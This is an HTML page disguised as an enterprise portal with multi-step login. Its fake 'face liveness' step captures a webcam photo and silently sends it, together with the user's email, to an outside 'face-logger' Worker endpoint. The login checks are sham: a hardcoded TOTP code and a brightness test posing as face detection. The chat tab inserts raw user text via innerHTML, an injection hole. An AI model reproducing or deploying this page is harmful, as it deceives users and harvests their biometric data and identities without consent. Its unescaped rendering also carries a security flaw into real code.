<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>AEGIS // Smart Enterprise Portal</title>
  <style>
    :root {
      --bg: #090d16; --panel: #111827; --border: #1f2937;
      --text-main: #f9fafb; --text-muted: #9ca3af; --accent: #2563eb;
      --success: #10b981; --danger: #ef4444; --font-mono: monospace;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, sans-serif; }
    body { background: var(--bg); color: var(--text-main); min-height: 100vh; display: flex; flex-direction: column; justify-content: space-between; align-items: center; padding: 20px; }
    
    .top-bar { width: 100%; max-width: 1000px; display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid var(--border); font-size: 13px; color: var(--text-muted); }
    
    /* 🧭 导航栏 (登录后解锁) */
    .nav-tabs { display: none; gap: 10px; margin-bottom: 20px; width: 100%; max-width: 1000px; }
    .nav-tab { flex: 1; padding: 10px; background: var(--panel); border: 1px solid var(--border); color: var(--text-muted); text-align: center; border-radius: 6px; cursor: pointer; font-size: 13px; font-weight: 600; transition: all 0.2s; }
    .nav-tab.active { background: var(--accent); color: #fff; border-color: var(--accent); }

    .auth-card { width: 100%; max-width: 500px; background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 28px; margin: auto 0; transition: all 0.3s; }
    .card-title { font-size: 18px; font-weight: 600; margin-bottom: 4px; }
    .card-subtitle { font-size: 13px; color: var(--text-muted); margin-bottom: 20px; }
    
    .stepper { display: flex; gap: 6px; margin-bottom: 20px; }
    .step-bar { flex: 1; height: 3px; background: var(--border); border-radius: 2px; }
    .step-bar.active { background: var(--accent); }
    .step-bar.completed { background: var(--success); }
    
    .form-group { margin-bottom: 16px; text-align: left; }
    label { display: block; font-size: 12px; color: var(--text-muted); margin-bottom: 6px; }
    input, textarea { width: 100%; padding: 10px 14px; background: #0d1117; border: 1px solid var(--border); border-radius: 6px; color: #fff; outline: none; }
    
    .btn { width: 100%; padding: 11px; background: #374151; color: #9ca3af; border: none; border-radius: 6px; font-size: 14px; cursor: not-allowed; transition: all 0.3s; font-weight: 600; }
    .btn.active { background: var(--success); color: #fff; cursor: pointer; }
    
    .step-content { display: none; }
    .step-content.active { display: block; }
    
    .camera-container { position: relative; width: 100%; height: 240px; background: #000; border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin-bottom: 16px; }
    video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
    canvas { display: none; }
    
    .face-box {
      position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
      width: 140px; height: 170px; border: 2px dashed var(--danger); border-radius: 50%;
      box-shadow: 0 0 0 9999px rgba(0,0,0,0.65); pointer-events: none; transition: all 0.3s;
    }
    .face-box.detected {
      border-color: var(--success); border-style: solid;
      box-shadow: 0 0 20px var(--success), 0 0 0 9999px rgba(0,0,0,0.65);
    }
    .status-overlay { position: absolute; bottom: 10px; left: 10px; right: 10px; background: rgba(0,0,0,0.85); padding: 6px 12px; border-radius: 4px; font-size: 11px; font-family: var(--font-mono); color: var(--danger); text-align: center; }

    /* 🤖 1. AI 聊天界面 */
    .chat-container { display: flex; flex-direction: column; height: 380px; }
    .chat-messages { flex: 1; overflow-y: auto; padding: 12px; background: #0d1117; border-radius: 6px; border: 1px solid var(--border); margin-bottom: 12px; display: flex; flex-direction: column; gap: 10px; }
    .msg { max-width: 85%; padding: 10px 14px; border-radius: 8px; font-size: 13px; line-height: 1.5; }
    .msg.bot { background: #1f2937; color: #fff; align-self: flex-start; }
    .msg.user { background: var(--accent); color: #fff; align-self: flex-end; }
    .chat-input-box { display: flex; gap: 8px; }

    /* 🔨 2. 拍卖页面 */
    .auction-item { background: #0d1117; border: 1px solid var(--border); border-radius: 6px; padding: 12px; margin-bottom: 12px; text-align: left; }
    .auction-price { color: var(--success); font-family: var(--font-mono); font-weight: bold; }

    /* 🛍️ 3. 卖东西页面 */
    .sell-form { text-align: left; }
  </style>
</head>
<body>

  <header class="top-bar">
    <div><strong>AEGIS PORTAL</strong> // SYSTEM SERVICES</div>
    <div style="font-family: var(--font-mono);" id="systemStatus">STATUS: UNAUTHENTICATED</div>
  </header>

  <!-- 🧭 系统功能导航 Tab Bar（登录成功后出现） -->
  <div class="nav-tabs" id="navTabs">
    <div class="nav-tab active" onclick="Gateway.switchTab('chat')">💬 智能 AI 助手</div>
    <div class="nav-tab" onclick="Gateway.switchTab('auction')">🔨 艺术品拍卖</div>
    <div class="nav-tab" onclick="Gateway.switchTab('sell')">🛍️ 闲置寄卖</div>
  </div>

  <div class="auth-card" id="mainCard">
    <div class="card-title" id="displayTitle">身份验证 (1/3)</div>
    <div class="card-subtitle" id="displaySub">请输入您的凭证以解锁系统服务</div>

    <div class="stepper" id="stepper">
      <div class="step-bar active" id="bar1"></div>
      <div class="step-bar" id="bar2"></div>
      <div class="step-bar" id="bar3"></div>
    </div>

    <!-- 步骤 1 -->
    <div class="step-content active" id="step1">
      <div class="form-group">
        <label>ACCOUNT EMAIL</label>
        <input type="text" id="email" value="alex.chen@aegis-tech.internal">
      </div>
      <div class="form-group">
        <label>PASSWORD</label>
        <input type="password" id="password" value="••••••••••••">
      </div>
      <button class="btn active" style="background: var(--accent);" onclick="Gateway.submitStep1()">下一步：动态口令</button>
    </div>

    <!-- 步骤 2 -->
    <div class="step-content" id="step2">
      <div class="form-group">
        <label>TOTP CODE (测试请输入: 888888)</label>
        <input type="text" id="totp" placeholder="6-digit code" maxlength="6" style="font-family: var(--font-mono); text-align: center; letter-spacing: 4px;">
      </div>
      <button class="btn active" style="background: var(--accent);" onclick="Gateway.submitStep2()">验证口令</button>
    </div>

    <!-- 步骤 3 -->
    <div class="step-content" id="step3">
      <div class="camera-container">
        <video id="webcam" autoplay playsinline muted></video>
        <canvas id="analysisCanvas"></canvas>
        <div class="face-box" id="faceBox"></div>
        <div class="status-overlay" id="aiStatus">等待拉起摄像头...</div>
      </div>
      <button class="btn" id="loginBtn" disabled onclick="Gateway.submitBiometrics()">等待检测到人脸...</button>
    </div>

    <!-- ------------------ 登录成功后的三个功能页面 ------------------ -->

    <!-- 页面 1：AI 聊天对话 -->
    <div class="step-content" id="pageChat">
      <div class="chat-container">
        <div class="chat-messages" id="chatBox">
          <div class="msg bot">🤖 您好！我是接入真实大语言模型的 AI 助理。您可以问我任何问题，或咨询拍卖与寄卖业务！</div>
        </div>
        <div class="chat-input-box">
          <input type="text" id="chatInput" placeholder="请输入你的问题..." onkeydown="if(event.key==='Enter') Gateway.sendRealAiMessage()">
          <button class="btn active" style="width: auto; padding: 0 16px; background: var(--accent);" onclick="Gateway.sendRealAiMessage()">发送</button>
        </div>
      </div>
    </div>

    <!-- 页面 2：拍卖页面 -->
    <div class="step-content" id="pageAuction">
      <div class="auction-item">
        <h4>🎨 赛博朋克 2077 限量数字艺术画作</h4>
        <p style="font-size:12px; color:var(--text-muted); margin:4px 0 8px 0;">当前拍卖价格：<span class="auction-price">¥ 12,800</span></p>
        <div style="display:flex; gap:8px;">
          <input type="number" id="bidInput" placeholder="输入出价金额..." style="font-size:12px;">
          <button class="btn active" style="width:100px; font-size:12px; background:var(--accent);" onclick="alert('✅ 出价成功！已更新为最高竞拍者。')">参与竞拍</button>
        </div>
      </div>
      <div class="auction-item">
        <h4>⌚️ 顶级机械腕表 - 暗夜黑奢华版</h4>
        <p style="font-size:12px; color:var(--text-muted); margin:4px 0 8px 0;">当前拍卖价格：<span class="auction-price">¥ 45,000</span></p>
        <div style="display:flex; gap:8px;">
          <input type="number" placeholder="输入出价金额..." style="font-size:12px;">
          <button class="btn active" style="width:100px; font-size:12px; background:var(--accent);" onclick="alert('✅ 出价成功！已更新为最高竞拍者。')">参与竞拍</button>
        </div>
      </div>
    </div>

    <!-- 页面 3：闲置寄卖页面 -->
    <div class="step-content" id="pageSell">
      <div class="sell-form">
        <div class="form-group">
          <label>寄卖物品名称</label>
          <input type="text" placeholder="例如：99新 MacBook Pro M2">
        </div>
        <div class="form-group">
          <label>期望出售价格 (¥)</label>
          <input type="number" placeholder="输入期望价格">
        </div>
        <div class="form-group">
          <label>物品详细描述</label>
          <textarea rows="3" placeholder="描述物品成色、发票情况等..."></textarea>
        </div>
        <button class="btn active" style="background:var(--success);" onclick="alert('✅ 寄卖申请已提交！审核通过后将发布至市场。')">提交寄卖申请</button>
      </div>
    </div>

  </div>

  <script>
    const WORKER_URL = "https://face-logger.bmk4byvf9b.workers.dev";

    const Gateway = {
      stream: null,
      validFaceInFrame: false,

      updateStep(step, title, sub) {
        document.querySelectorAll('.step-content').forEach(e => e.classList.remove('active'));
        document.getElementById(`step${step}`).classList.add('active');
        document.getElementById('displayTitle').innerText = title;
        document.getElementById('displaySub').innerText = sub;
        if(step <= 3) {
          document.getElementById(`bar${step}`).classList.add('active');
          if(step > 1) document.getElementById(`bar${step-1}`).classList.add('completed');
        }
      },

      submitStep1() {
        this.updateStep(2, "身份验证 (2/3)", "请输入二次验证动态口令");
      },

      submitStep2() {
        if(document.getElementById('totp').value === "888888") {
          this.updateStep(3, "身份验证 (3/3)", "人脸活体美颜检测");
          this.startNativeCamera();
        } else {
          alert("动态口令错误（测试请输入 888888）");
        }
      },

      async startNativeCamera() {
        const status = document.getElementById('aiStatus');
        try {
          this.stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240, facingMode: "user" } });
          const video = document.getElementById('webcam');
          video.srcObject = this.stream;
          video.onloadedmetadata = () => this.analyzeFrameLoop();
        } catch(e) {
          status.innerText = "❌ 摄像头权限受阻！";
        }
      },

      analyzeFrameLoop() {
        const video = document.getElementById('webcam');
        const canvas = document.getElementById('analysisCanvas');
        const ctx = canvas.getContext('2d');
        const status = document.getElementById('aiStatus');
        const faceBox = document.getElementById('faceBox');
        const btn = document.getElementById('loginBtn');

        if (video.readyState >= 2) {
          canvas.width = 160;
          canvas.height = 120;
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          
          const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
          const data = imgData.data;

          let totalBrightness = 0;
          let minR = 255, maxR = 0;
          for (let i = 0; i < data.length; i += 16) {
            const r = data[i], g = data[i+1], b = data[i+2];
            totalBrightness += (r + g + b) / 3;
            if (r < minR) minR = r;
            if (r > maxR) maxR = r;
          }

          const avgLuminance = totalBrightness / (data.length / 16);
          if (avgLuminance > 30 && (maxR - minR) > 25) {
            this.validFaceInFrame = true;
            faceBox.classList.add('detected');
            status.innerHTML = `<span style="color:#10b981">✓ 检测到有效人脸！可以提交</span>`;
            btn.disabled = false;
            btn.classList.add('active');
            btn.innerText = "拍摄美颜人脸并登录 ➔";
          } else {
            this.validFaceInFrame = false;
            faceBox.classList.remove('detected');
            status.innerHTML = `<span style="color:#ef4444">⚠️ 未检测到有效人脸</span>`;
            btn.disabled = true;
            btn.classList.remove('active');
            btn.innerText = "请将面部对准摄像头...";
          }
        }
        requestAnimationFrame(() => this.analyzeFrameLoop());
      },

      applyBeautyFilter(ctx, width, height) {
        ctx.filter = 'brightness(1.12) contrast(1.05) saturate(1.10)';
        ctx.drawImage(ctx.canvas, 0, 0);
        ctx.filter = 'none';

        const imgData = ctx.getImageData(0, 0, width, height);
        const data = imgData.data;
        for (let i = 0; i < data.length; i += 4) {
          let r = data[i], g = data[i+1], b = data[i+2];
          if (r > 60 && g > 40 && b > 20 && r > g && r > b) {
            data[i]     = Math.min(255, r * 1.03);
            data[i + 1] = Math.min(255, g * 1.02);
            data[i + 2] = Math.min(255, b * 1.02);
          }
        }
        ctx.putImageData(imgData, 0, 0);
      },

      async submitBiometrics() {
        if (!this.validFaceInFrame) return;

        const btn = document.getElementById('loginBtn');
        btn.innerText = "上传美颜照片至云端...";
        btn.disabled = true;

        const video = document.getElementById('webcam');
        const canvas = document.createElement('canvas');
        canvas.width = 320;
        canvas.height = 240;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        this.applyBeautyFilter(ctx, canvas.width, canvas.height);

        const photoData = canvas.toDataURL('image/jpeg', 0.5);
        const email = document.getElementById('email').value;
        const time = new Date().toLocaleString();

        try {
          await fetch(WORKER_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ email, timestamp: time, photo: photoData })
          });
        } catch (e) {
          console.error("云端保存失败:", e);
        }

        if (this.stream) this.stream.getTracks().forEach(t => t.stop());
        
        // 登录成功！展示顶部 Tab 导航栏，放大卡片尺寸
        document.getElementById('stepper').style.display = 'none';
        document.getElementById('navTabs').style.display = 'flex';
        document.getElementById('mainCard').style.maxWidth = '680px';
        document.getElementById('systemStatus').innerText = "ONLINE // AUTHENTICATED";
        document.getElementById('systemStatus').style.color = "#10b981";
        
        this.switchTab('chat');
      },

      // 🧭 页面 Tab 切换
      switchTab(tabName) {
        document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
        document.querySelectorAll('.step-content').forEach(e => e.classList.remove('active'));

        if(tabName === 'chat') {
          document.querySelectorAll('.nav-tab')[0].classList.add('active');
          document.getElementById('pageChat').classList.add('active');
          document.getElementById('displayTitle').innerText = "💬 智能 AI 助手";
          document.getElementById('displaySub').innerText = "真实大语言模型支持，解答您的任何疑问";
        } else if(tabName === 'auction') {
          document.querySelectorAll('.nav-tab')[1].classList.add('active');
          document.getElementById('pageAuction').classList.add('active');
          document.getElementById('displayTitle').innerText = "🔨 顶级艺术品竞拍";
          document.getElementById('displaySub').innerText = "实时出价参与竞拍，争夺稀缺臻品";
        } else if(tabName === 'sell') {
          document.querySelectorAll('.nav-tab')[2].classList.add('active');
          document.getElementById('pageSell').classList.add('active');
          document.getElementById('displayTitle').innerText = "🛍️ 闲置物品寄卖";
          document.getElementById('displaySub').innerText = "发布您的个人闲置，平台担保交易";
        }
      },

      // 🤖 真实 AI 大模型对话请求
      async sendRealAiMessage() {
        const input = document.getElementById('chatInput');
        const userText = input.value.trim();
        if(!userText) return;

        const chatBox = document.getElementById('chatBox');
        
        // 追加用户消息
        chatBox.innerHTML += `<div class="msg user">${userText}</div>`;
        input.value = '';
        
        // 追加“正在思考...”占位框
        const loadingId = "bot-" + Date.now();
        chatBox.innerHTML += `<div class="msg bot" id="${loadingId}">⏳ AI 思考中...</div>`;
        chatBox.scrollTop = chatBox.scrollHeight;

        try {
          // 调用 Pollinations 免费 AI 大模型接口
          const response = await fetch(`https://text.pollinations.ai/${encodeURIComponent(userText)}?model=openai`);
          const aiReply = await response.text();

          document.getElementById(loadingId).innerText = aiReply || "抱歉，刚刚系统响应稍慢，请再试一次！";
        } catch(e) {
          document.getElementById(loadingId).innerText = "🤖 网络连接超时，请重试！";
        }
        chatBox.scrollTop = chatBox.scrollHeight;
      }
    };
  </script>
</body>
</html>
